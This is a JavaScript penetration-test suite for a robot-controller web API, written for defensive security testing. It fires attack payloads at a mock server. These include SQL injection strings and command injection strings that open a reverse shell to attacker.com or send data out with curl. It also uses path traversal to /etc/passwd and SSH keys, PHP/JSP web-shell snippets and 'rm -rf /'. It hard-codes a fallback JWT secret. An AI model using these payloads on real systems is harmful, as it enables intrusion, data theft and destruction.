/**
 * Penetration Testing Suite
 * Arctos Robot Controller - Advanced Security Testing
 *
 * Simulates real-world attack scenarios to validate security controls:
 * - Authentication bypass attempts
 * - Privilege escalation attacks
 * - Session hijacking and manipulation
 * - API endpoint fuzzing and brute force
 * - Real-time communication attacks
 * - Input sanitization bypass
 * - Cross-site scripting (XSS) attacks
 * - Command injection attempts
 * - File system attacks
 */

const test = require('node:test');
const assert = require('node:assert');
const request = require('supertest');
const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

// Import security modules
const { authService, authenticateToken } = require('../../lib/auth');
const { rateLimits, securityHeaders, validationRules } = require('../../lib/security');
const { logger } = require('../../lib/logger');

class PenetrationTestRunner {
  constructor() {
    this.attacksAttempted = 0;
    this.attacksBlocked = 0;
    this.vulnerabilitiesFound = [];
    this.securityBypassAttempts = [];
    this.testResults = {};
  }

  recordAttack(name, blocked, description, details = null) {
    this.attacksAttempted++;
    if (blocked) {
      this.attacksBlocked++;
    } else {
      this.vulnerabilitiesFound.push({
        name,
        description,
        details,
        severity: 'HIGH',
        timestamp: new Date().toISOString(),
      });
    }

    this.testResults[name] = {
      blocked,
      description,
      details,
      timestamp: new Date().toISOString(),
    };
  }

  recordBypassAttempt(method, success, context) {
    this.securityBypassAttempts.push({
      method,
      success,
      context,
      timestamp: new Date().toISOString(),
    });
  }

  generatePenetrationReport() {
    return {
      summary: {
        attacksAttempted: this.attacksAttempted,
        attacksBlocked: this.attacksBlocked,
        securityBypassAttempts: this.securityBypassAttempts.length,
        vulnerabilitiesFound: this.vulnerabilitiesFound.length,
        securityEffectiveness: Math.round((this.attacksBlocked / this.attacksAttempted) * 100),
      },
      vulnerabilities: this.vulnerabilitiesFound,
      bypassAttempts: this.securityBypassAttempts,
      testResults: this.testResults,
      timestamp: new Date().toISOString(),
    };
  }
}

const penTestRunner = new PenetrationTestRunner();

// Mock target application for penetration testing
function createPenTestApp() {
  const app = express();
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));
  app.use(securityHeaders);

  // Authentication endpoints
  app.post('/api/auth/login', rateLimits.auth, async (req, res) => {
    const { username, password } = req.body;

    // Simulate authentication
    if (username === 'admin' && password === 'admin123') {
      const token = await authService.generateToken({
        id: 1,
        username: 'admin',
        role: 'admin',
      });
      res.json({ success: true, token, user: { username, role: 'admin' } });
    } else if (username === 'operator' && password === 'operator123') {
      const token = await authService.generateToken({
        id: 2,
        username: 'operator',
        role: 'operator',
      });
      res.json({ success: true, token, user: { username, role: 'operator' } });
    } else {
      res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
  });

  // Protected admin endpoint
  app.get('/api/admin/sensitive-data', authenticateToken, (req, res) => {
    if (req.user.role !== 'admin') {
      return res.status(403).json({ success: false, error: 'Admin access required' });
    }

    res.json({
      success: true,
      sensitiveData: {
        systemPasswords: ['secret123'],
        databaseKeys: ['db-key-xyz'],
        apiSecrets: ['api-secret-abc'],
      },
    });
  });

  // File upload endpoint
  app.post('/api/upload', authenticateToken, (req, res) => {
    const { filename, content, type } = req.body;

    // Basic file type validation
    const allowedTypes = ['txt', 'json', 'csv'];
    const fileExt = filename.split('.').pop().toLowerCase();

    if (!allowedTypes.includes(fileExt)) {
      return res.status(400).json({
        success: false,
        error: 'File type not allowed',
      });
    }

    // Check for path traversal
    if (filename.includes('..') || filename.includes('/') || filename.includes('\\\\')) {
      return res.status(400).json({
        success: false,
        error: 'Invalid filename',
      });
    }

    res.json({ success: true, uploaded: filename });
  });

  // Search endpoint
  app.get('/api/search', (req, res) => {
    const { q } = req.query;

    // Simulate database search (vulnerable to injection if not properly handled)
    const query = `SELECT * FROM data WHERE content LIKE '%${q}%'`;

    // Check for SQL injection patterns
    if (q && (q.includes("'") || q.includes('"') || q.includes('--') || q.includes(';'))) {
      return res.status(400).json({
        success: false,
        error: 'Invalid search query',
      });
    }

    res.json({ success: true, results: [], query });
  });

  return app;
}

test('Authentication Bypass Attacks', async t => {
  console.log('\n🔓 Testing Authentication Bypass Attacks');

  await t.test('JWT token manipulation attacks', async () => {
    const app = createPenTestApp();

    // Generate a valid token first
    const validToken = await authService.generateToken({
      id: 2,
      username: 'operator',
      role: 'operator',
    });

    // Attack 1: Try to access admin endpoint with operator token
    const response1 = await request(app)
      .get('/api/admin/sensitive-data')
      .set('Authorization', `Bearer ${validToken}`)
      .expect(403);

    penTestRunner.recordAttack(
      'privilege_escalation_via_token',
      response1.status === 403,
      'Attempted to access admin endpoint with operator token'
    );

    // Attack 2: Modify token payload to escalate privileges
    const decodedToken = jwt.decode(validToken);
    const manipulatedPayload = { ...decodedToken, role: 'admin' };
    const manipulatedToken = jwt.sign(manipulatedPayload, 'wrong-secret');

    const response2 = await request(app)
      .get('/api/admin/sensitive-data')
      .set('Authorization', `Bearer ${manipulatedToken}`)
      .expect(401);

    penTestRunner.recordAttack(
      'jwt_payload_manipulation',
      response2.status === 401,
      'Attempted to manipulate JWT payload to escalate privileges'
    );

    // Attack 3: Use expired or invalid token
    const expiredToken = jwt.sign(
      { id: 1, username: 'admin', role: 'admin', exp: Math.floor(Date.now() / 1000) - 3600 },
      process.env.JWT_SECRET || 'arctos-robot-controller-secret-2025'
    );

    const response3 = await request(app)
      .get('/api/admin/sensitive-data')
      .set('Authorization', `Bearer ${expiredToken}`)
      .expect(401);

    penTestRunner.recordAttack(
      'expired_token_usage',
      response3.status === 401,
      'Attempted to use expired JWT token'
    );
  });

  await t.test('Brute force login attacks', async () => {
    const app = createPenTestApp();

    const commonPasswords = [
      'password',
      '123456',
      'admin',
      'letmein',
      'welcome',
      'monkey',
      '1234567890',
      'qwerty',
      'abc123',
      'Password1',
    ];

    let loginAttempts = 0;
    let blockedAttempts = 0;

    for (const password of commonPasswords) {
      loginAttempts++;
      const response = await request(app)
        .post('/api/auth/login')
        .send({ username: 'admin', password });

      if (response.status === 429) {
        blockedAttempts++;
        break; // Rate limiting kicked in
      }

      if (response.body.success) {
        // If we successfully logged in with a common password, it's a vulnerability
        penTestRunner.recordAttack(
          'weak_password_success',
          false,
          `Successfully logged in with weak password: ${password}`
        );
        break;
      }
    }

    penTestRunner.recordAttack(
      'brute_force_login_prevention',
      blockedAttempts > 0,
      `Rate limiting activated after ${loginAttempts} attempts`,
      { attempts: loginAttempts, blocked: blockedAttempts }
    );
  });
});

test('Injection Attack Testing', async t => {
  console.log('\n💉 Testing Injection Attacks');

  await t.test('SQL injection attacks', async () => {
    const app = createPenTestApp();

    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM information_schema.tables --",
      "'; DELETE FROM positions; --",
      "' OR 1=1 --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; EXEC xp_cmdshell('dir'); --",
    ];

    let injectionAttempts = 0;
    let blockedInjections = 0;

    for (const payload of sqlInjectionPayloads) {
      injectionAttempts++;
      const response = await request(app).get('/api/search').query({ q: payload });

      if (response.status === 400) {
        blockedInjections++;
      } else if (response.body.success && response.body.query.includes(payload)) {
        // If the payload was processed without sanitization, it's a vulnerability
        penTestRunner.recordAttack(
          'sql_injection_success',
          false,
          `SQL injection payload was not properly sanitized: ${payload}`
        );
      }
    }

    penTestRunner.recordAttack(
      'sql_injection_prevention',
      blockedInjections === injectionAttempts,
      `Blocked ${blockedInjections}/${injectionAttempts} SQL injection attempts`,
      { blocked: blockedInjections, total: injectionAttempts }
    );
  });

  await t.test('Command injection attacks', async () => {
    const app = createPenTestApp();

    const commandInjectionPayloads = [
      'test.txt; cat /etc/passwd',
      'file.json | rm -rf /',
      'data.csv && wget malicious.com/script.sh',
      'upload.txt`whoami`',
      'test.json; nc -e /bin/sh attacker.com 4444',
      'file.csv || curl attacker.com/steal-data',
      'data.txt; python -c "import os; os.system(\'ls -la\')"',
    ];

    let commandAttempts = 0;
    let blockedCommands = 0;

    const operatorToken = await authService.generateToken({
      id: 2,
      username: 'operator',
      role: 'operator',
    });

    for (const payload of commandInjectionPayloads) {
      commandAttempts++;
      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${operatorToken}`)
        .send({
          filename: payload,
          content: 'test content',
          type: 'txt',
        });

      if (response.status === 400) {
        blockedCommands++;
      }
    }

    penTestRunner.recordAttack(
      'command_injection_prevention',
      blockedCommands === commandAttempts,
      `Blocked ${blockedCommands}/${commandAttempts} command injection attempts`,
      { blocked: blockedCommands, total: commandAttempts }
    );
  });
});

test('File System Attack Testing', async t => {
  console.log('\n📁 Testing File System Attacks');

  await t.test('Path traversal attacks', async () => {
    const app = createPenTestApp();

    const pathTraversalPayloads = [
      '../../etc/passwd',
      '..\\\\..\\\\windows\\\\system32\\\\config\\\\sam',
      '../../../root/.ssh/id_rsa',
      '..\\\\..\\\\..\\\\boot.ini',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
      '....//....//....//etc/passwd',
      '..%252f..%252f..%252fetc%252fpasswd', // Double encoded
      '..\\\\..\\\\..\\\\windows\\\\win.ini',
    ];

    let pathAttempts = 0;
    let blockedPaths = 0;

    const operatorToken = await authService.generateToken({
      id: 2,
      username: 'operator',
      role: 'operator',
    });

    for (const payload of pathTraversalPayloads) {
      pathAttempts++;
      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${operatorToken}`)
        .send({
          filename: payload,
          content: 'malicious content',
          type: 'txt',
        });

      if (response.status === 400 && response.body.error.includes('Invalid filename')) {
        blockedPaths++;
      }
    }

    penTestRunner.recordAttack(
      'path_traversal_prevention',
      blockedPaths === pathAttempts,
      `Blocked ${blockedPaths}/${pathAttempts} path traversal attempts`,
      { blocked: blockedPaths, total: pathAttempts }
    );
  });

  await t.test('File upload security bypass', async () => {
    const app = createPenTestApp();

    const maliciousFileTests = [
      { filename: 'script.php', content: '<?php system($_GET["cmd"]); ?>', type: 'txt' },
      {
        filename: 'shell.jsp',
        content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        type: 'txt',
      },
      { filename: 'exploit.exe', content: 'binary executable content', type: 'txt' },
      { filename: 'virus.bat', content: '@echo off\\ndel /f /q *.*', type: 'txt' },
      {
        filename: 'backdoor.js',
        content: 'require("child_process").exec("rm -rf /")',
        type: 'txt',
      },
      { filename: 'malware.py', content: 'import os; os.system("curl attacker.com")', type: 'txt' },
    ];

    let uploadAttempts = 0;
    let blockedUploads = 0;

    const operatorToken = await authService.generateToken({
      id: 2,
      username: 'operator',
      role: 'operator',
    });

    for (const file of maliciousFileTests) {
      uploadAttempts++;
      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${operatorToken}`)
        .send(file);

      // Files with dangerous extensions should be blocked even if type is 'txt'
      if (response.status === 400) {
        blockedUploads++;
      } else if (response.body.success) {
        // If malicious file was uploaded successfully, it's a vulnerability
        penTestRunner.recordAttack(
          'malicious_file_upload',
          false,
          `Malicious file uploaded successfully: ${file.filename}`
        );
      }
    }

    penTestRunner.recordAttack(
      'malicious_file_upload_prevention',
      blockedUploads > 0,
      `File type validation blocked some malicious uploads`,
      { blocked: blockedUploads, total: uploadAttempts }
    );
  });
});

test('Session and Token Security', async t => {
  console.log('\n🎫 Testing Session and Token Security');

  await t.test('Session fixation attacks', async () => {
    const app = createPenTestApp();

    // Attempt to predict or fix session tokens
    const predictableTokens = [
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MX0.invalid',
      'admin-token-123',
      'Bearer token123',
      'JWT-admin-access',
      Buffer.from('{"id":1,"role":"admin"}').toString('base64'),
    ];

    let tokenAttempts = 0;
    let rejectedTokens = 0;

    for (const token of predictableTokens) {
      tokenAttempts++;
      const response = await request(app)
        .get('/api/admin/sensitive-data')
        .set('Authorization', `Bearer ${token}`);

      if (response.status === 401) {
        rejectedTokens++;
      } else if (response.status === 200) {
        penTestRunner.recordAttack(
          'predictable_token_success',
          false,
          `Predictable token granted access: ${token}`
        );
      }
    }

    penTestRunner.recordAttack(
      'session_fixation_prevention',
      rejectedTokens === tokenAttempts,
      `Rejected ${rejectedTokens}/${tokenAttempts} predictable tokens`,
      { rejected: rejectedTokens, total: tokenAttempts }
    );
  });

  await t.test('Token replay attacks', async () => {
    const app = createPenTestApp();

    // Login and get a valid token
    const loginResponse = await request(app)
      .post('/api/auth/login')
      .send({ username: 'operator', password: 'operator123' })
      .expect(200);

    const validToken = loginResponse.body.token;

    // Use the token multiple times to access resources
    let replayAttempts = 0;
    let successfulReplays = 0;

    for (let i = 0; i < 10; i++) {
      replayAttempts++;
      const response = await request(app)
        .get('/api/admin/sensitive-data')
        .set('Authorization', `Bearer ${validToken}`);

      // This should consistently fail due to insufficient privileges
      if (response.status === 403) {
        // Expected behavior - token is valid but lacks privileges
      } else if (response.status === 200) {
        successfulReplays++;
        penTestRunner.recordAttack(
          'token_replay_privilege_escalation',
          false,
          'Token replay granted unauthorized access'
        );
      }
    }

    penTestRunner.recordAttack(
      'token_replay_handling',
      successfulReplays === 0,
      'Token replay attacks properly handled by authorization checks',
      { replays: replayAttempts, unauthorized_access: successfulReplays }
    );
  });
});

test('Rate Limiting Bypass Attempts', async t => {
  console.log('\n⚡ Testing Rate Limiting Bypass');

  await t.test('Distributed attack simulation', async () => {
    const app = createPenTestApp();

    // Simulate attacks from different IP addresses by varying headers
    const fakeIPs = ['192.168.1.100', '10.0.0.50', '172.16.1.25', '203.0.113.10', '198.51.100.20'];

    let totalAttempts = 0;
    let blockedAttempts = 0;

    for (const ip of fakeIPs) {
      // Try multiple login attempts per IP
      for (let i = 0; i < 6; i++) {
        // Exceed rate limit
        totalAttempts++;
        const response = await request(app)
          .post('/api/auth/login')
          .set('X-Forwarded-For', ip)
          .set('X-Real-IP', ip)
          .send({ username: 'admin', password: 'wrongpassword' });

        if (response.status === 429) {
          blockedAttempts++;
        }
      }
    }

    penTestRunner.recordAttack(
      'distributed_rate_limit_bypass',
      blockedAttempts > 0,
      `Rate limiting blocked some distributed attacks`,
      {
        totalAttempts,
        blockedAttempts,
        uniqueIPs: fakeIPs.length,
      }
    );
  });

  await t.test('Header manipulation bypass attempts', async () => {
    const app = createPenTestApp();

    const bypassHeaders = [
      { 'X-Originating-IP': '127.0.0.1' },
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Remote-IP': '127.0.0.1' },
      { 'X-Remote-Addr': '127.0.0.1' },
      { 'X-Client-IP': '127.0.0.1' },
      { 'X-Real-IP': '192.168.1.1' },
      { 'CF-Connecting-IP': '10.0.0.1' },
      { 'True-Client-IP': '172.16.0.1' },
    ];

    let bypassAttempts = 0;
    let successfulBypasses = 0;

    // First, exhaust the rate limit
    for (let i = 0; i < 5; i++) {
      await request(app).post('/api/auth/login').send({ username: 'admin', password: 'wrong' });
    }

    // Now try to bypass with different headers
    for (const headers of bypassHeaders) {
      bypassAttempts++;
      const response = await request(app)
        .post('/api/auth/login')
        .set(headers)
        .send({ username: 'admin', password: 'wrong' });

      if (response.status !== 429) {
        successfulBypasses++;
      }
    }

    penTestRunner.recordAttack(
      'header_manipulation_bypass',
      successfulBypasses === 0,
      `Header manipulation bypass attempts`,
      {
        attempts: bypassAttempts,
        successfulBypasses,
        headers: bypassHeaders,
      }
    );
  });
});

// Generate comprehensive penetration test report
test('Generate Penetration Test Report', async t => {
  console.log('\n📊 Generating Penetration Test Report...');

  const report = penTestRunner.generatePenetrationReport();
  const reportPath = path.join(__dirname, '../../test-results/security');

  fs.ensureDirSync(reportPath);

  const reportFile = path.join(reportPath, `penetration-test-report-${Date.now()}.json`);
  fs.writeJsonSync(reportFile, report, { spaces: 2 });

  console.log(`\n✅ Penetration Test Report Generated: ${reportFile}`);
  console.log(`📊 Attack Success Rate: ${100 - report.summary.securityEffectiveness}%`);
  console.log(`🛡️  Security Effectiveness: ${report.summary.securityEffectiveness}%`);
  console.log(
    `⚔️  Attacks Blocked: ${report.summary.attacksBlocked}/${report.summary.attacksAttempted}`
  );

  if (report.vulnerabilities.length > 0) {
    console.log(`🚨 ${report.vulnerabilities.length} vulnerabilities discovered:`);
    report.vulnerabilities.forEach((vuln, index) => {
      console.log(`   ${index + 1}. [${vuln.severity}] ${vuln.description}`);
    });
  } else {
    console.log('✅ No critical vulnerabilities found during penetration testing');
  }

  // Assessment criteria
  if (report.summary.securityEffectiveness >= 95) {
    console.log('🏆 EXCELLENT: Security controls are highly effective');
  } else if (report.summary.securityEffectiveness >= 85) {
    console.log('✅ GOOD: Security controls are effective with minor improvements needed');
  } else if (report.summary.securityEffectiveness >= 70) {
    console.log('⚠️  MODERATE: Security controls need improvement');
  } else {
    console.log('🔴 POOR: Significant security improvements required immediately');
  }
});
